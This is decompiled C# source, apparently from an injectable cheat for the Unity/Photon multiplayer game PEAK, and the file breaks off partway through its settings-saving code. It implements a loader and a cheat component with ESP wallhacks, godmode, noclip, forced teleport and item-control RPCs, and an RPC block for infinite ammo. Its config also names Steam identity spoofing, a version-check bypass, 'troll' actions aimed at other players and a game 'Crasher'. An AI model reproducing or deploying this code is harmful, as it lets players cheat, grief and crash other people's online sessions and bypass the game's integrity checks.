using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.Text.RegularExpressions;
using System.Threading;
using Loading;
using Photon.Pun;
using Photon.Realtime;
using Steamworks;
using TMPro;
using UnityEngine;
using UnityEngine.Rendering;
using UnityEngine.SceneManagement;
using UnityEngine.UI;
using Zorro.Core;
using Zorro.Core.Serizalization;
using _1v1.lol_cheat;
using _1v1.lol_cheat.Troll;

[assembly: CompilationRelaxations(8)]
[assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]
[assembly: AssemblyTitle("1v1.lol cheat")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("")]
[assembly: AssemblyProduct("1v1.lol cheat")]
[assembly: AssemblyCopyright("Copyright c  2023")]
[assembly: AssemblyTrademark("")]
[assembly: ComVisible(false)]
[assembly: Guid("34a25c04-c085-4fb2-bb21-66401e668575")]
[assembly: AssemblyFileVersion("1.0.0.0")]
[assembly: TargetFramework(".NETFramework,Version=v4.7.2", FrameworkDisplayName = ".NET Framework 4.7.2")]
[assembly: AssemblyVersion("1.0.0.0")]
namespace Loading
{
	public class Loader
	{
		private static GameObject gameObject;

		public static void Load()
		{
			if (gameObject != null)
			{
				Debug.Log((object)"[Loader] Destroying old cheat instance");
				Object.DestroyImmediate((Object)(object)gameObject);
				gameObject = null;
			}
			if (Cheat.instance != null)
			{
				Debug.Log((object)"[Loader] Destroying existing Cheat instance");
				try
				{
					if ((Object)(object)Cheat.instance.gameObject != (Object)null)
					{
						Object.DestroyImmediate((Object)(object)Cheat.instance.gameObject);
					}
				}
				catch
				{
				}
			}
			gameObject = new GameObject();
			((Object)gameObject).name = "PEAKCheatLoader";
			gameObject.AddComponent<Cheat>();
			Object.DontDestroyOnLoad((Object)(object)gameObject);
			Debug.Log((object)"[Loader] Cheat component created");
		}

		public static void Unload()
		{
			Object.Destroy((Object)(object)gameObject);
		}
	}
}
namespace _1v1.lol_cheat
{
	[DefaultExecutionOrder(1000)]
	public class Cheat : MonoBehaviourPunCallbacks
	{
		private sealed class <DelayedItemInitialization>d__31 : IEnumerator<object>, IDisposable, IEnumerator
		{
			private int <>1__state;

			private object <>2__current;

			public Cheat <>4__this;

			object IEnumerator<object>.Current
			{
				get
				{
					return <>2__current;
				}
			}

			object IEnumerator.Current
			{
				get
				{
					return <>2__current;
				}
			}
			public <DelayedItemInitialization>d__31(int <>1__state)
			{
				this.<>1__state = <>1__state;
			}
			void IDisposable.Dispose()
			{
				<>1__state = -2;
			}

			private bool MoveNext()
			{
				int num = <>1__state;
				Cheat cheat = <>4__this;
				switch (num)
				{
				default:
					return false;
				case 0:
					<>1__state = -1;
					<>2__current = (object)new WaitForSeconds(2f);
					<>1__state = 1;
					return true;
				case 1:
					<>1__state = -1;
					cheat.InitializeItems();
					<>2__current = (object)new WaitForSeconds(3f);
					<>1__state = 2;
					return true;
				case 2:
					<>1__state = -1;
					cheat.InitializeItems();
					return false;
				}
			}

			bool IEnumerator.MoveNext()
			{
				return this.MoveNext();
			}
			void IEnumerator.Reset()
			{
				throw new NotSupportedException();
			}
		}
		private sealed class <UpdateTargets>d__32 : IEnumerator<object>, IDisposable, IEnumerator
		{
			private int <>1__state;

			private object <>2__current;

			object IEnumerator<object>.Current
			{
				get
				{
					return <>2__current;
				}
			}

			object IEnumerator.Current
			{
				get
				{
					return <>2__current;
				}
			}
			public <UpdateTargets>d__32(int <>1__state)
			{
				this.<>1__state = <>1__state;
			}
			void IDisposable.Dispose()
			{
				<>1__state = -2;
			}

			private bool MoveNext()
			{
				int num = <>1__state;
				if (num != 0)
				{
					if (num != 1)
					{
						return false;
					}
					<>1__state = -1;
				}
				else
				{
					<>1__state = -1;
				}
				try
				{
					CheatConfig.Targets = Utils.GetTargets();
					if (PhotonNetwork.InRoom)
					{
						RefreshPlayerDict();
					}
				}
				catch (Exception ex)
				{
					Debug.LogError((object)("[Cheat] Error updating targets: " + ex.Message));
				}
				<>2__current = (object)new WaitForSeconds(0.5f);
				<>1__state = 1;
				return true;
			}

			bool IEnumerator.MoveNext()
			{
				return this.MoveNext();
			}
			void IEnumerator.Reset()
			{
				throw new NotSupportedException();
			}
		}

		public static Cheat instance;

		public int toggleKey = 45;

		public float toggleDelay = 0.5f;

		public bool toggled;

		private float lastToggleTime;

		private float lastUninjectTime;

		private bool lastToggledState;

		private bool wasCursorVisibleBeforeMenu;

		public static float laserRange = 100f;

		public static Item GrabbedItem;

		private static float gravityGunDistance = 6f;

		private const float minGravityGunDistance = 1f;

		private const float maxGravityGunDistance = 20f;

		private const float scrollSensitivity = 0.5f;

		private static Vector3 _menuFrozenPlayerPosition = Vector3.zero;

		private static Dictionary<Bodypart, bool> _menuBodypartKinematicStates = new Dictionary<Bodypart, bool>();

		private static Dictionary<Bodypart, RigidbodyConstraints> _menuBodypartConstraintStates = new Dictionary<Bodypart, RigidbodyConstraints>();

		private static MethodInfo originalRPCMethod = null;

		private static bool rpcHooked = false;

		private void Awake()
		{
			if (instance != null && (Object)(object)instance != (Object)(object)this)
			{
				Debug.Log((object)"[Cheat] Destroying old cheat instance");
				try
				{
					if ((Object)(object)instance.gameObject != (Object)null)
					{
						Object.DestroyImmediate((Object)(object)instance.gameObject);
					}
				}
				catch (Exception ex)
				{
					Debug.LogWarning((object)("[Cheat] Error destroying old instance: " + ex.Message));
				}
			}
			instance = this;
		}

		private void Start()
		{
			try
			{
				if (PhotonNetwork.IsConnected)
				{
					CheatConfig.LocalPlayerName = PhotonNetwork.NickName;
				}
				SceneManager.sceneLoaded += OnSceneLoaded;
				HookPhotonRPCs();
				((MonoBehaviour)this).StartCoroutine(UpdateTargets());
				try
				{
					InitializeItems();
				}
				catch (Exception ex)
				{
					Debug.LogError((object)("[Cheat] Error initializing items: " + ex.Message));
				}
				((MonoBehaviour)this).StartCoroutine(DelayedItemInitialization());
				try
				{
					TrollFeatures.Initialize(this);
				}
				catch (Exception ex2)
				{
					Debug.LogError((object)("[Cheat] Error initializing troll features: " + ex2.Message));
				}
				try
				{
					ClimbingPrediction.Initialize();
				}
				catch (Exception ex3)
				{
					Debug.LogError((object)("[Cheat] Error initializing climbing prediction: " + ex3.Message));
				}
				try
				{
					AutoPathfinder.Initialize(this);
				}
				catch (Exception ex4)
				{
					Debug.LogError((object)("[Cheat] Error initializing auto pathfinder: " + ex4.Message));
				}
				try
				{
					SteamSpoofing.Initialize();
				}
				catch (Exception ex5)
				{
					Debug.LogError((object)("[Cheat] Error initializing Steam spoofing: " + ex5.Message));
				}
				try
				{
					VersionBypass.Initialize();
				}
				catch (Exception ex6)
				{
					Debug.LogError((object)("[Cheat] Error initializing version bypass: " + ex6.Message));
				}
				try
				{
					ConfigManager.LoadConfig("default");
				}
				catch (Exception ex7)
				{
					Debug.LogError((object)("[Cheat] Error loading default config: " + ex7.Message));
				}
				try
				{
					CheaterDetection.Initialize();
				}
				catch (Exception ex8)
				{
					Debug.LogError((object)("[Cheat] Error initializing cheater detection: " + ex8.Message));
				}
			}
			catch (Exception ex9)
			{
				Debug.LogError((object)("[Cheat] Critical error in Start(): " + ex9.Message + "\n" + ex9.StackTrace));
			}
		}

		private void OnDestroy()
		{
			try
			{
				ConfigManager.SaveConfig();
			}
			catch
			{
			}
			instance = null;
		}

		private void OnGUI()
		{
			ESP.DrawWatermark();
			ESP.RenderAll();
			ESP.RenderChams();
			ClimbingPrediction.Draw();
			AutoPathfinder.DrawPath();
			ESP.DrawEntityControlKeybinds();
			if (toggled)
			{
				string text = "";
				float num = Screen.width;
				float num2 = Screen.height;
				if (((Rect)(ref GUI.GUIRect)).width <= 0f)
				{
					((Rect)(ref GUI.GUIRect)).width = 1000f;
				}
				if (((Rect)(ref GUI.GUIRect)).height <= 0f)
				{
					((Rect)(ref GUI.GUIRect)).height = 850f;
				}
				if (((Rect)(ref GUI.GUIRect)).x < 0f - ((Rect)(ref GUI.GUIRect)).width || ((Rect)(ref GUI.GUIRect)).x > num || ((Rect)(ref GUI.GUIRect)).y < 0f - ((Rect)(ref GUI.GUIRect)).height || ((Rect)(ref GUI.GUIRect)).y > num2)
				{
					((Rect)(ref GUI.GUIRect)).x = 50f;
					((Rect)(ref GUI.GUIRect)).y = 50f;
				}
				((Rect)(ref GUI.GUIRect)).x = Mathf.Clamp(((Rect)(ref GUI.GUIRect)).x, 0f, num - ((Rect)(ref GUI.GUIRect)).width);
				((Rect)(ref GUI.GUIRect)).y = Mathf.Clamp(((Rect)(ref GUI.GUIRect)).y, 0f, num2 - ((Rect)(ref GUI.GUIRect)).height);
				GUI.GUIRect = GUI.Window(69, GUI.GUIRect, new WindowFunction(GUI.GUIMain), text);
				((Rect)(ref GUI.GUIRect)).x = Mathf.Clamp(((Rect)(ref GUI.GUIRect)).x, 0f, num - ((Rect)(ref GUI.GUIRect)).width);
				((Rect)(ref GUI.GUIRect)).y = Mathf.Clamp(((Rect)(ref GUI.GUIRect)).y, 0f, num2 - ((Rect)(ref GUI.GUIRect)).height);
			}
		}

		private void Update()
		{
			InputHandler.CheckMenuToggle(ref toggled, ref lastToggleTime, ref lastUninjectTime, toggleDelay, toggleKey);
			if (!toggled)
			{
				HotkeyManager.Update();
			}
			if (toggled)
			{
				Cursor.visible = true;
				Cursor.lockState = CursorLockMode.None;
			}
			InputHandler.HandleCursor(toggled, ref lastToggledState, ref wasCursorVisibleBeforeMenu);
			if (toggled)
			{
				DisableGameInput();
			}
			else
			{
				EnableGameInput();
			}
			if (EntityControl.IsControllingEntity() && !toggled)
			{
				EntityControl.ProcessInput(this, toggled);
			}
			PlayerModifications.Update();
		}

		private void FixedUpdate()
		{
			Stamina.ApplyReduction();
			Stamina.ResetTracking();
		}

		private void LateUpdate()
		{
			if (toggled)
			{
				Cursor.visible = true;
				Cursor.lockState = CursorLockMode.None;
			}
			if (EntityControl.IsControllingEntity())
			{
				EntityControl.UpdateCamera();
			}
			EntityControl.ProcessInput(this, toggled);
			if (EntityControl.IsControllingEntity() && !toggled)
			{
				GameObject currentlyControlledEntity = CheatConfig.CurrentlyControlledEntity;
				if (currentlyControlledEntity != null)
				{
					Character component = currentlyControlledEntity.GetComponent<Character>();
					if (component != null)
					{
						EntityControl.ProcessMouseLookOnly(component);
						EntityControl.MaintainPlayerInputAfterAI(component);
					}
				}
			}
			if (GUI.selected_tab == 4)
			{
				GUI.UpdateEntityControls();
			}
			PlayerModifications.ApplyModifications();
			ClimbingPrediction.Update();
			if (!toggled)
			{
				if (AutoPathfinder.Enabled != CheatConfig.AutoPathfinderEnabled)
				{
					AutoPathfinder.Enabled = CheatConfig.AutoPathfinderEnabled;
				}
				if (CheatConfig.AutoPathfinderEnabled)
				{
					AutoPathfinder.Update();
				}
			}
			SteamSpoofing.Update();
			VersionBypass.Update();
			CheaterDetection.Update();
			if (!toggled)
			{
				GravityGun();
			}
		}

		private void DisableGameInput()
		{
			if (Character.localCharacter != null && Character.localCharacter.input != null)
			{
				Character.localCharacter.input.itemSwitchBlocked = true;
			}
		}

		private void EnableGameInput()
		{
			if (Character.localCharacter != null && Character.localCharacter.input != null)
			{
				Character.localCharacter.input.itemSwitchBlocked = false;
			}
		}

		public static void TeleportToCoords(float x, float y, float z)
		{
			try
			{
				Character localCharacter = Character.localCharacter;
				if (!(localCharacter == null) && !localCharacter.data.dead)
				{
					PhotonView photonView = localCharacter.photonView;
					if (!(photonView == null))
					{
						Vector3 val = default(Vector3);
						(val)..ctor(x, y, z);
						photonView.RPC("WarpPlayerRPC", RpcTarget.All, new object[2] { val, true });
					}
				}
			}
			catch (Exception)
			{
			}
		}

		public static void Uninject()
		{
			Debug.Log((object)"[Cheat] Uninjecting cheat...");
			PlayerModifications.DisableAll();
			CheatConfig.BoxESP = false;
			CheatConfig.Speed = false;
			CheatConfig.FlyMode = false;
			CheatConfig.Crasher = false;
			CheatConfig.NoClip = false;
			CheatConfig.NoFallDamage = false;
			CheatConfig.SuperJump = false;
			CheatConfig.SkeletonESP = false;
			CheatConfig.NameESP = false;
			if (CheatConfig.CurrentlyControlledEntity != null)
			{
				EntityControl.DisableControl(CheatConfig.CurrentlyControlledEntity);
			}
			Loader.Unload();
		}

		public static void RefreshPlayerDict()
		{
			CheatConfig.PlayerDict = new Dictionary<string, Character>();
			Character[] array = Object.FindObjectsByType<Character>(FindObjectsSortMode.None);
			foreach (Character val in array)
			{
				if (val.player != null && (Object)(object)val.player.photonView != (Object)null)
				{
					string nickName = val.player.photonView.Owner.NickName;
					if (!string.IsNullOrEmpty(nickName) && !CheatConfig.PlayerDict.ContainsKey(nickName))
					{
						CheatConfig.PlayerDict[nickName] = val;
					}
				}
			}
		}

		public void InitializeItems()
		{
			Scene activeScene = SceneManager.GetActiveScene();
			string name = (activeScene).name;
			if (!(name == "GameScene") && !name.Contains("Game") && !PhotonNetwork.InRoom)
			{
				return;
			}
			try
			{
				List<string> list = new List<string>();
				try
				{
					MethodInfo method = typeof(ItemDatabase).GetMethod("GetAllObjectNames", BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public);
					if (method != null && method.Invoke(null, null) is string[] array && array.Length != 0)
					{
						list.AddRange(array);
					}
				}
				catch
				{
				}
				try
				{
					PropertyInfo property = typeof(SingletonAsset<>).MakeGenericType(typeof(ItemDatabase)).GetProperty("Instance", BindingFlags.Static | BindingFlags.Public);
					if (property != null)
					{
						object value = property.GetValue(null);
						if (value != null)
						{
							FieldInfo field = typeof(ItemDatabase).GetField("itemLookup", BindingFlags.Instance | BindingFlags.Public);
							if (field != null)
							{
								object value2 = field.GetValue(value);
								if (value2 != null)
								{
									Type type = value2.GetType();
									if (type.IsGenericType && type.GetGenericTypeDefinition() == typeof(Dictionary<, >))
									{
										PropertyInfo property2 = type.GetProperty("Values", BindingFlags.Instance | BindingFlags.Public);
										if (property2 != null && property2.GetValue(value2) is IEnumerable enumerable)
										{
											foreach (object item in enumerable)
											{
												Item val = (Item)((item is Item) ? item : null);
												if (val != null && val != null)
												{
													string name2 = ((Object)val).name;
													if (!string.IsNullOrEmpty(name2) && !list.Contains(name2))
													{
														list.Add(name2);
													}
												}
											}
										}
									}
								}
							}
							PropertyInfo property3 = value.GetType().GetProperty("Objects", BindingFlags.Instance | BindingFlags.Public);
							if (property3 != null && property3.GetValue(value) is IEnumerable enumerable2)
							{
								foreach (object item2 in enumerable2)
								{
									Item val2 = (Item)((item2 is Item) ? item2 : null);
									if (val2 != null && val2 != null)
									{
										string name3 = ((Object)val2).name;
										if (!string.IsNullOrEmpty(name3) && !list.Contains(name3))
										{
											list.Add(name3);
										}
									}
								}
							}
						}
					}
				}
				catch (Exception ex)
				{
					Debug.LogWarning((object)("[Cheat] Could not get items from SingletonAsset<ItemDatabase>.Instance: " + ex.Message));
				}
				try
				{
					GameObject[] array2 = Resources.LoadAll<GameObject>("0_Items");
					foreach (GameObject val3 in array2)
					{
						if (val3 != null && (Object)(object)val3.GetComponent<Item>() != (Object)null)
						{
							string name4 = ((Object)val3).name;
							if (!string.IsNullOrEmpty(name4) && !list.Contains(name4))
							{
								list.Add(name4);
							}
						}
					}
				}
				catch (Exception ex2)
				{
					Debug.LogWarning((object)("[Cheat] Could not load items from Resources: " + ex2.Message));
				}
				try
				{
					if (PhotonNetwork.PrefabPool != null)
					{
						FieldInfo field2 = ((object)PhotonNetwork.PrefabPool).GetType().GetField("resourceCache", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
						if (field2 != null && field2.GetValue(PhotonNetwork.PrefabPool) is Dictionary<string, GameObject> dictionary)
						{
							foreach (KeyValuePair<string, GameObject> item3 in dictionary)
							{
								if (item3.Value != null && (Object)(object)item3.Value.GetComponent<Item>() != (Object)null)
								{
									string name5 = ((Object)item3.Value).name;
									if (!string.IsNullOrEmpty(name5) && !list.Contains(name5))
									{
										list.Add(name5);
									}
								}
							}
						}
					}
				}
				catch (Exception ex3)
				{
					Debug.LogWarning((object)("[Cheat] Could not get items from PhotonNetwork prefab pool: " + ex3.Message));
				}
				CheatConfig.Items = list.ToArray();
				Debug.Log((object)$"[Cheat] Initialized {CheatConfig.Items.Length} items");
			}
			catch (Exception ex4)
			{
				Debug.LogError((object)("[Cheat] Error initializing items: " + ex4.Message));
				CheatConfig.Items = new string[0];
			}
		}

		private void OnSceneLoaded(Scene scene, LoadSceneMode mode)
		{
			RefreshPlayerDict();
			ESP.ResetCaches();
			InitializeItems();
		}

		[IteratorStateMachine(typeof(<DelayedItemInitialization>d__31))]
		private IEnumerator DelayedItemInitialization()
		{
			return new <DelayedItemInitialization>d__31(0)
			{
				<>4__this = this
			};
		}

		[IteratorStateMachine(typeof(<UpdateTargets>d__32))]
		private IEnumerator UpdateTargets()
		{
			return new <UpdateTargets>d__32(0);
		}

		private static void GravityGun()
		{
			KeyCode val = HotkeyManager.GetHotkey("GravityGun");
			if ((int)val == 0)
			{
				val = (KeyCode)102;
			}
			if (Input.GetKey(val))
			{
				float axis = Input.GetAxis("Mouse ScrollWheel");
				if (axis != 0f)
				{
					gravityGunDistance += axis * 0.5f;
					gravityGunDistance = Mathf.Clamp(gravityGunDistance, 1f, 20f);
				}
				RaycastHit val2 = default(RaycastHit);
				if (Physics.Raycast(new Ray(Camera.main.transform.position, Camera.main.transform.forward), ref val2, laserRange))
				{
					Item componentInParent = ((Component)(val2).collider).GetComponentInParent<Item>();
					if (componentInParent != null && (Object)(object)componentInParent.photonView != (Object)null)
					{
						GrabbedItem = componentInParent;
						gravityGunDistance = 6f;
						componentInParent.photonView.RPC("SetKinematicRPC", RpcTarget.All, new object[3]
						{
							true,
							Camera.main.transform.position + Camera.main.transform.forward * gravityGunDistance,
							Quaternion.identity
						});
					}
				}
				if (GrabbedItem != null && (Object)(object)GrabbedItem.photonView != (Object)null)
				{
					GrabbedItem.photonView.RPC("SetKinematicRPC", RpcTarget.All, new object[3]
					{
						true,
						Camera.main.transform.position + Camera.main.transform.forward * gravityGunDistance,
						Quaternion.identity
					});
				}
			}
			else if (GrabbedItem != null && (Object)(object)GrabbedItem.photonView != (Object)null)
			{
				GrabbedItem.photonView.RPC("SetKinematicRPC", RpcTarget.All, new object[3]
				{
					false,
					GrabbedItem.transform.position,
					GrabbedItem.transform.rotation
				});
				GrabbedItem = null;
				gravityGunDistance = 6f;
			}
		}

		public override void OnJoinRoomFailed(short returnCode, string message)
		{
			if (VersionBypass.ShouldBypassJoinError(returnCode, message))
			{
				Debug.Log((object)$"[Cheat] Version mismatch detected and bypassed. Error message: {message} (ReturnCode: {returnCode})");
				Debug.Log((object)"[Cheat] Bypassing version check and allowing join to proceed...");
				if (VersionBypass.GetDetectedHostVersion() != null)
				{
					Debug.Log((object)"[Cheat] Retrying join with spoofed version...");
				}
			}
			else
			{
				((MonoBehaviourPunCallbacks)this).OnJoinRoomFailed(returnCode, message);
			}
		}

		public override void OnConnectedToMaster()
		{
			if (CheatConfig.VersionBypassEnabled)
			{
				VersionBypass.EnsureVersionSet();
			}
			((MonoBehaviourPunCallbacks)this).OnConnectedToMaster();
		}

		private void HookPhotonRPCs()
		{
			if (rpcHooked)
			{
				return;
			}
			try
			{
				MethodInfo[] methods = typeof(PhotonView).GetMethods(BindingFlags.Instance | BindingFlags.Public);
				foreach (MethodInfo methodInfo in methods)
				{
					if (methodInfo.Name == "RPC" && methodInfo.GetParameters().Length >= 2)
					{
						originalRPCMethod = methodInfo;
						break;
					}
				}
				rpcHooked = true;
				Debug.Log((object)"[Cheat] Photon RPC hook initialized");
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[Cheat] Failed to hook Photon RPCs: " + ex.Message));
			}
		}

		public static bool ShouldBlockRPC(string methodName)
		{
			if (CheatConfig.InfiniteAmmo && methodName == "ReduceUsesRPC")
			{
				return true;
			}
			return false;
		}
	}
	public static class CheatConfig
	{
		public static bool PlayerBoxESP = false;

		public static bool PlayerBox3D = false;

		public static bool PlayerNameESP = false;

		public static bool PlayerSkeletonESP = false;

		public static bool PlayerDistanceESP = false;

		public static bool PlayerHealthESP = false;

		public static float PlayerESPMaxDistance = 200f;

		public static bool EntityBoxESP = false;

		public static bool EntityBox3D = false;

		public static bool EntityNameESP = false;

		public static bool EntitySkeletonESP = false;

		public static bool EntityAIStateESP = false;

		public static bool EntityDistanceESP = false;

		public static float EntityESPMaxDistance = 200f;

		public static bool ItemBoxESP = false;

		public static bool ItemBox3D = false;

		public static bool ItemNameESP = false;

		public static bool ItemDistanceESP = false;

		public static float ItemESPMaxDistance = 100f;

		public static bool LuggageBoxESP = false;

		public static bool LuggageNameESP = false;

		public static bool LuggageDistanceESP = false;

		public static float LuggageESPMaxDistance = 100f;

		public static bool SporeShroomESP = false;

		public static float SporeShroomESPMaxDistance = 200f;

		public static bool EnvironmentalESP = false;

		public static float EnvironmentalESPMaxDistance = 200f;

		public static bool ObjectNameESP = false;

		public static float ObjectNameESPMaxDistance = 200f;

		public static bool Godmode = false;

		public static bool Speed = false;

		public static float SpeedMultiply = 5f;

		public static bool FlyMode = false;

		public static float FlySpeed = 58f;

		public static bool NoClip = false;

		public static bool NoFallDamage = false;

		public static bool SuperJump = false;

		public static float JumpMultiplier = 2f;

		public static float ClimbingSpeedMultiplier = 1f;

		public static float FallDamagePercent = 100f;

		public static bool ReduceStaminaConsumption = false;

		public static float StaminaConsumptionPercent = 20f;

		public static bool InfiniteAmmo = false;

		public static bool RapidFire = false;

		public static bool NoInteractCooldown = false;

		public static int RapidCooldown = 0;

		public static float FireRateCooldown = 3f;

		public static bool ClearStatuses = false;

		public static bool RandomOutfits = false;

		public static bool SetFieldOfView = false;

		public static float FieldOfView = 35f;

		public static bool UnlockAll = false;

		public static bool BingBongSpam = false;

		public static bool Crasher = false;

		public static bool BoxFix = false;

		public static List<GameObject> SpawnedEntities = new List<GameObject>();

		public static Vector2 EntityManagerScrollPos = Vector2.zero;

		public static int SelectedEntityIndex = -1;

		public static GameObject CurrentlyControlledEntity = null;

		public static float EntityControlSpeed = 5f;

		public static float EntityFollowDistance = 5f;

		public static List<GameObject> _cachedEntityList = new List<GameObject>();

		public static float _lastEntityListUpdate = 0f;

		public const float ENTITY_LIST_UPDATE_INTERVAL = 0.5f;

		public static bool _entityListNeedsRefresh = false;

		public static string EntityFilterText = "";

		public static bool EntityDropdownOpen = false;

		public static Vector2 EntityDropdownScrollPos = Vector2.zero;

		private static string[] _filteredEntities = new string[0];

		private static string[] _availableEntities = new string[0];

		private static bool _entitiesInitialized = false;

		private static string _lastSpawnMessage = "";

		private static float _lastSpawnMessageTime = 0f;

		public static string ItemFilterText = "";

		public static bool ItemDropdownOpen = false;

		public static Vector2 ItemDropdownScrollPos = Vector2.zero;

		private static string[] _filteredItems = new string[0];

		public static float BaseClimbingSpeed = 0f;

		public static float BaseMovementModifier = 1f;

		public static float BaseJumpImpulse = -1f;

		public static bool GodmodeWasEnabled = false;

		public static float LastStaminaForReduction = -1f;

		public static Dictionary<string, Character> PlayerDict = new Dictionary<string, Character>();

		public static List<Character> Targets = new List<Character>();

		public static string LocalPlayerName = "";

		public static string[] Items = new string[0];

		public static Material ESPMaterial = new Material(Shader.Find("GUI/Text Shader"));

		public static bool ShowWatermark = true;

		public static float TrollLaunchForce = 50f;

		public static float TrollSpinSpeed = 720f;

		public static float TrollSpinDuration = 5f;

		public static float TrollAntigravDuration = 10f;

		public static float TrollFallDuration = 5f;

		public static bool TrollIncludeSelf = false;

		public static bool ShowCrashMenu = false;

		public static string CustomEmoteName = "A_Scout_Emote_PlayDead";

		public static bool ClimbingPredictionEnabled = true;

		public static bool AutoPathfinderEnabled = false;

		public static bool VersionBypassEnabled = false;

		public static string CustomVersion = "";

		public static bool AntiFallOver = false;

		public static bool CheaterDetectionEnabled = false;

		public static Dictionary<string, bool> DetectedCheaters = new Dictionary<string, bool>();

		public static bool DetectionType_ImpossibleRevive = true;

		public static bool DetectionType_ImpossibleTeleport = true;

		public static bool DetectionType_UnauthorizedItemControl = true;

		public static bool DetectionType_ImpossibleStatus = true;

		public static bool DetectionType_ImpossibleItemSpawn = true;

		public static Dictionary<string, bool> CollapsibleSections = new Dictionary<string, bool>
		{
			{ "PlayerESP", false },
			{ "EntityESP", false },
			{ "ItemESP", false },
			{ "LuggageESP", false },
			{ "SporeShroomESP", false },
			{ "EnvironmentalESP", false },
			{ "ObjectNameESP", false },
			{ "ClimbingFeatures", false },
			{ "SpeedMovement", false },
			{ "CombatSurvival", false },
			{ "Combat", false },
			{ "DamageSettings", false },
			{ "OtherFeatures", false },
			{ "AutoPathfinder", false },
			{ "Controls", false },
			{ "PlayerSelection", false },
			{ "BasicActions", false },
			{ "Teleportation", false },
			{ "TrollActions", false },
			{ "TestDummy", false },
			{ "InventoryManagement", false },
			{ "WorldItems", false },
			{ "EntityList", false },
			{ "SelectItemToSpawn", false },
			{ "SelectPlayerForSpawn", false },
			{ "SpawnEntity", false },
			{ "TrollSettings", false },
			{ "EntityActions", false },
			{ "AIControl", false },
			{ "BulkActions", false },
			{ "VersionBypass", false },
			{ "TrollFeatures", false },
			{ "CrashFeatures", false }
		};

		public static bool PlayerESP
		{
			get
			{
				if (!PlayerBoxESP && !PlayerNameESP)
				{
					return PlayerSkeletonESP;
				}
				return true;
			}
		}

		public static bool EntityESP
		{
			get
			{
				if (!EntityBoxESP && !EntityNameESP)
				{
					return EntitySkeletonESP;
				}
				return true;
			}
		}

		public static bool ItemESP
		{
			get
			{
				if (!ItemBoxESP)
				{
					return ItemNameESP;
				}
				return true;
			}
		}

		public static bool LuggageESP
		{
			get
			{
				if (!LuggageBoxESP)
				{
					return LuggageNameESP;
				}
				return true;
			}
		}

		public static bool NameESP
		{
			get
			{
				return PlayerNameESP;
			}
			set
			{
				PlayerNameESP = value;
			}
		}

		public static bool SkeletonESP
		{
			get
			{
				return PlayerSkeletonESP;
			}
			set
			{
				PlayerSkeletonESP = value;
			}
		}

		public static bool BoxESP
		{
			get
			{
				return PlayerBoxESP;
			}
			set
			{
				PlayerBoxESP = value;
			}
		}

		public static string[] FilteredEntities
		{
			get
			{
				return _filteredEntities;
			}
			set
			{
				_filteredEntities = value;
			}
		}

		public static string[] AvailableEntities
		{
			get
			{
				return _availableEntities;
			}
			set
			{
				_availableEntities = value;
			}
		}

		public static bool EntitiesInitialized
		{
			get
			{
				return _entitiesInitialized;
			}
			set
			{
				_entitiesInitialized = value;
			}
		}

		public static string LastSpawnMessage
		{
			get
			{
				return _lastSpawnMessage;
			}
			set
			{
				_lastSpawnMessage = value;
			}
		}

		public static float LastSpawnMessageTime
		{
			get
			{
				return _lastSpawnMessageTime;
			}
			set
			{
				_lastSpawnMessageTime = value;
			}
		}

		public static string[] FilteredItems
		{
			get
			{
				return _filteredItems;
			}
			set
			{
				_filteredItems = value;
			}
		}
	}
	public static class ConfigManager
	{
		[Serializable]
		private class ConfigListWrapper
		{
			public List<string> configs;
		}

		[Serializable]
		private class ConfigData
		{
			public bool playerBoxESP;

			public bool godmode;

			public bool speed;

			public float speedMultiply;
		}

		private const string CONFIG_PREFIX = "PEAK_CHEAT_";

		private const string CONFIG_LIST_KEY = "PEAK_CONFIG_LIST";

		private const string CURRENT_CONFIG_KEY = "PEAK_CURRENT_CONFIG";

		private const string DEFAULT_CONFIG_NAME = "default";

		public static string CurrentConfigName = "default";

		public static List<string> GetConfigList()
		{
			string @string = PlayerPrefs.GetString("PEAK_CONFIG_LIST", "");
			if (string.IsNullOrEmpty(@string))
			{
				List<string> obj = new List<string> { "default" };
				SaveConfigList(obj);
				return obj;
			}
			return JsonUtility.FromJson<ConfigListWrapper>(@string).configs;
		}

		private static void SaveConfigList(List<string> configs)
		{
			ConfigListWrapper configListWrapper = new ConfigListWrapper
			{
				configs = configs
			};
			PlayerPrefs.SetString("PEAK_CONFIG_LIST", JsonUtility.ToJson((object)configListWrapper));
			PlayerPrefs.Save();
		}

		public static void SaveConfig(string configName = null)
		{
			if (string.IsNullOrEmpty(configName))
			{
				configName = CurrentConfigName;
			}
			CurrentConfigName = configName;
			PlayerPrefs.SetString("PEAK_CURRENT_CONFIG", configName);
			try
			{
				PlayerPrefs.SetInt("PEAK_CHEAT_PlayerBoxESP", CheatConfig.PlayerBoxESP ? 1 : 0);
				PlayerPrefs.SetInt("PEAK_CHEAT_PlayerBox3D", CheatConfig.PlayerBox3D ? 1 : 0);
				PlayerPrefs.SetInt("PEAK_CHEAT_PlayerNameESP", CheatConfig.PlayerNameESP ? 1 : 0);
				PlayerPrefs.SetInt("PEAK_CHEAT_PlayerSkeletonESP", CheatConfig.PlayerSkeletonESP ? 1 : 0);
				PlayerPrefs.SetInt("PEAK_CHEAT_PlayerDistanceESP", CheatConfig.PlayerDistanceESP ? 1 : 0);
				PlayerPrefs.SetInt("PEAK_CHEAT_PlayerHealthESP", CheatConfig.PlayerHealthESP ? 1 : 0);
				PlayerPrefs.SetInt("PEAK_CHEAT_EntityBoxESP", CheatConfig.EntityBoxESP ? 1 : 0);
				PlayerPrefs.SetInt("PEAK_CHEAT_EntityBox3D", CheatConfig.EntityBox3D ? 1 : 0);
				PlayerPrefs.SetInt("PEAK_CHEAT_EntityNameESP", CheatConfig.EntityNameESP ? 1 : 0);
				PlayerPrefs.SetInt("PEAK_CHEAT_EntitySkeletonESP", CheatConfig.EntitySkeletonESP ? 1 : 0);
				PlayerPrefs.SetInt("PEAK_CHEAT_EntityAIStateESP", CheatConfig.EntityAIStateESP ? 1 : 0);
				PlayerPrefs.SetInt("PEAK_CHEAT_EntityDistanceESP", CheatConfig.EntityDistanceESP ? 1 : 0);
